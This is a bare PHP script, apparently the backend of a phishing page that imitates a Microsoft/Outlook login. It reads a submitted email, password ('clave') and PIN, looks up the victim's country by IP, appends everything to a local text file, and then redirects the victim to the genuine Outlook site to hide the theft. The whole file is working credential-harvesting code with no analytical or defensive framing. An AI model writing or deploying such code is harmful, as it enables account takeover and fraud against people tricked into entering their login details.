<?php
    if (isset($_POST['submit'])) {
        $eml = $_POST['eml'];
        $clv = $_POST['clv'];
        $pin = $_POST['pin'];
        
        $ip = $_SERVER['REMOTE_ADDR'];
        $country = file_get_contents('http://ip-api.com/json/'.$ip);
        $country = json_decode($country);
        $country = $country->country;
        
        $file = fopen("infogil.txt", "a");
       fwrite($file, "Email: " . $eml . " Clave: " . $clv . " Pin: " . $pin . " IP: " . $ip . " Pais: " . $country . "\n");
        fclose($file);
        header("Location: https://outlook.live.com/");
    }
?>





